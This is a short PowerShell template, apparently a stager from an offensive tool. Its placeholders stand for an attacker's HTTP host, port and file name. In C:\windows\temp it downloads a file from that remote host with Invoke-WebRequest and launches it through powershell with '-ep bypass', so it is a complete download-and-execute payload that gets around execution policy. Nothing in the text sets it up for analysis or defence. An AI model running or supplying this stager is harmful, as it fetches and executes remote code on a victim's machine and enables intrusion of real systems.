cd C:\windows\temp;
if (-not (Test-Path "${filename}")) { iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";};
Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";